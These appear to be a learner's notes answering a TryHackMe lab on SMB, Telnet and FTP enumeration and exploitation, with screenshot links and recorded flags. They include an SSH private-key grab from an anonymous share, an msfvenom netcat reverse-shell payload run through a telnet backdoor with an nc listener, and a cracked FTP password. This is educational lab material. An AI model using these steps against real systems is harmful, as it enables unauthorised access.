- Note: Different IP addresses indicates that the task was completed on a different day. 
- Task 1: Get Connected
	- Ready? Let's get going!
		- No answer needed
- Task 2: Understanding SMB
	- What does SMB stand for?
		- Server Message Block
	- What type of protocol is SMB?
		- response-request
	- What do clients connect to servers using?
		- TCP/IP
	- What systems does Samba run on?
		- Unix
- Task 3: Enumerating SMB 
	- Conduct an **nmap** scan of your choosing, How many ports are open?
		- ![[nmap -sS 10.10.22.206.png]]
	- Used nmap -sS (SYN Scan) on 10.10.22.206 for a quick, stealthy, and accurate scan. 
		- 3
	- What ports is **SMB** running on?
		- 139/445
	- Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the **workgroup** name?
		- ![[enum4linux -a 10.10.22.206.png]]
		- ![[enum4linux output 1.png]]
		- WORKGROUP
	- What comes up as the **name** of the machine?
		- POLOSMB
	- What operating system **version** is running?
		- 6.1
	- What share sticks out as something we might want to investigate?
		- ![[enum4linux output 2.png]]
		- profiles
- Task 4: Exploiting SMB
	- What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?
		- smbclient //10.10.10.2/secret -U suit -p 445
	- Great! Now you've got a hang of the syntax, let's have a go at trying to exploit this vulnerability. You have a list of users, the name of the share (smb) and a suspected vulnerability.
		- No answer needed
	- Does the share allow anonymous access? Y/N?
		-  ![[Pasted image 20241222084214.png]]
		- Y
	- Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?
		- ![[Pasted image 20241222084340.png]]
		- ![[Pasted image 20241223074527.png]]
		- ![[Pasted image 20241223075029.png]]
		- John Cactus
	- What service has been configured to allow him to work from home?
		- ssh
	- Okay! Now we know this, what directory on the share should we look in?
		- .ssh
	- This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?
		- ![[cd .ssh followed by ls.png]]
		- id_rsa
	- Download this file to your local machine, and change the permissions to "600" using "chmod 600 [file]".
		- ![[Pasted image 20241224075137.png]]
		- ![[Pasted image 20241223081545.png]]

	- Or
		-  ![[Pasted image 20241224080747.png]]
	- Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server.

	- What is the smb.txt flag?
		- THM{smb_is_fun_eh?}
- Task 5: Understanding Telnet
	- What is Telnet?
		- application protocol
	- What has slowly replaced Telnet?
		- ssh
	- How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?
		- telnet 10.10.10.3 23
	- The lack of what, means that all Telnet communication is in plaintext?
		- encryption
- Task 6: Enumerating Telnet
	- How many **ports** are open on the target machine?
		- ![[Pasted image 20241225084648.png]]
		- 1
	- What **port** is this?
		- 8012
	- This port is unassigned, but still lists the **protocol** it's using, what protocol is this?
		- TCP
	- Now re-run the **nmap** scan, without the **-p-** tag, how many ports show up as open?
		- ![[Pasted image 20241225085004.png]]
		- 0
	- Here, we see that by assigning telnet to a **non-standard port**, it is not part of the common ports list, or top 1000 ports, that nmap scans. It's important to try every angle when enumerating, as the information you gather here will inform your exploitation stage.
		- No answer needed
	- Based on the title returned to us, what do we think this port could be **used for**?
		- ![[Pasted image 20241226072509.png]]
		- a backdoor
	- Who could it belong to? Gathering possible **usernames** is an important step in enumeration.
		- Skidy
	- Always keep a note of information you find during your enumeration stage, so you can refer back to it when you move on to try exploits.
		- No answer needed
- Task 7: Exploiting Telnet
	- Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.
		- ![[Pasted image 20241229083921.png]]
		- No answer needed
	- Great! It's an open telnet connection! What welcome message do we receive?
		- SKIDY'S BACKDOOR.
	- Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)
		- N
	- Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command.
		- No answer needed
	- Now, use the command **"ping [local THM ip] -c 1"** through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)
		- ping on victim's machine
		- ![[Pasted image 20241229083820.png]]
		- sudo tcpdump ip proto \\icmp -i ens5 on attacker's machine
		- ![[Pasted image 20241228085027.png]]
		- Y
	- Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!
		- No answer needed
	- We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:
		- msfvenom -p cmd/unix/reverse_netcat lhost=[local ens5 ip] lport=4444 R
		- 
	- What word does the generated payload start with?
	- mkfifo
	- Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine.
		- "nc -lvnp [listening port chosen]"
	- What would the command look like for the listening port we selected in our payload?
		- nc -lvnp 4444
	- Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!

		- No answer needed
	- Success! What is the contents of flag.txt?
		- THM{y0u_g0t_th3_t3ln3t_fl4g}
- Task 8: Understanding FTP
	- What communications model does FTP use?
		- client-server
	- What's the standard FTP port?
		- 21
	- How many modes of FTP connection are there?
		- 2 (active or passive)
- Task 9: Enumerating FTP
	- How many **ports** are open on the target machine?
		- ![[Pasted image 20241230081216.png]]
		- 2
	- What **port** is ftp running on?
		- 21
	- What **variant** of FTP is running on it?
		- vsftpd
	- Great, now we know what type of FTP server we're dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing "_ftp [IP]_" into the console, and entering "anonymous", and no password when prompted.
	- What is the name of the file in the anonymous FTP directory?
		- PUBLIC_NOTICE.txt
	- What do we think a possible username?
		- ![[Pasted image 20241230083857.png]]
		- ![[Pasted image 20241230084103.png]]
		- Mike
	- Great! Now we've got details about the FTP server and, crucially, a possible username. Let's see what we can do with that...
		- No answer needed
could be?
- Task 10: Exploiting FTP
	- What is the password for the user "mike"?
	- ![[Pasted image 20241230084727.png]]
	- password
	- ![[Pasted image 20241230084930.png]]
